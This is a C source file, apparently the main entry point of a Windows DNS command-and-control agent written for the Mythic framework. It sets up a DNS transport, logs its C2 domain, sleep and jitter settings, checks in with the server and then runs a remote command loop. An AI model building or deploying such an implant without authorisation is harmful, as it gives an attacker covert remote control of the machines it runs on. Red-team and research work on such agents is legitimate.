/**
 * main.c - Entry point for DNS C2 Agent
 */

#include <winsock2.h>
#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <stdarg.h>

#include "include/Transport.h"
#include "include/Command.h"
#include "include/Config.h"
#include "include/Utils.h"
#include "include/mythic.h"

// Si no se pasó DEBUG_MODE desde el compilador, lo desactivamos
#ifndef DEBUG_MODE
#define DEBUG_MODE 0
#endif

/**
 * Debug print function (solo si DEBUG_MODE = 1)
 */
static void debug_print(const char* format, ...) {
#if DEBUG_MODE
    va_list args;
    va_start(args, format);
    vprintf(format, args);
    va_end(args);
#endif
}

/**
 * Initialize the agent: transport, log configuration values
 *
 * @return TRUE on success; FALSE on failure.
 */
static BOOL initialize_agent(void) {
    debug_print("[*] Initializing agent...\n");

    // 1) Inicializar transporte DNS
    if (!dns_transport_init()) {
        debug_print("[!] Failed to initialize DNS transport\n");
        return FALSE;
    }
    debug_print("[+] DNS transport initialized\n");

    // 2) Resetear config a defaults
    reset_config();
    debug_print("[+] Configuration reset to defaults\n");

    // 3) Mostrar valores activos
    debug_print("[+] C2 domain      : %s\n", get_c2_domain());
    debug_print("[+] Sleep interval : %lu ms\n", (unsigned long)get_sleep_interval());
    debug_print("[+] Jitter percent : %lu%%\n", (unsigned long)get_jitter_percentage());
    debug_print("[+] msginit prefix : %s\n", get_msginit());
    debug_print("[+] msgdefault type: %s\n", get_msgdefault());

    return TRUE;
}

/**
 * Clean up the agent: transport shutdown
 */
static void cleanup_agent(void) {
    debug_print("[*] Cleaning up agent...\n");
    // aquí podrías llamar a dns_transport_cleanup() si existiera
    debug_print("[+] DNS transport cleaned up\n");
}

/**
 * Main entry point
 */
int main(int argc, char* argv[]) {
    debug_print("[*] DNS C2 Agent starting...\n");

    // 1) Inicializar
    if (!initialize_agent()) {
        debug_print("[!] Agent initialization failed\n");
        return EXIT_FAILURE;
    }

    // 2) Primer check-in y registro de callback
    debug_print("[*] Performing initial check-in...\n");
    char* callback_json = transport_perform_checkin();
    if (!callback_json) {
        debug_print("[!] Initial check-in failed\n");
        cleanup_agent();
        return EXIT_FAILURE;
    }
    register_callback(callback_json);
    free(callback_json);
    debug_print("[+] Initial check-in & callback registration successful\n");

    // 3) Bucle de comandos (bloqueante)
    debug_print("[*] Entering command loop...\n");
    
    int result = command_loop();

    // 4) Limpieza y salida
    cleanup_agent();
    debug_print("[*] DNS C2 Agent exiting with code %d\n", result);
    return result;
}
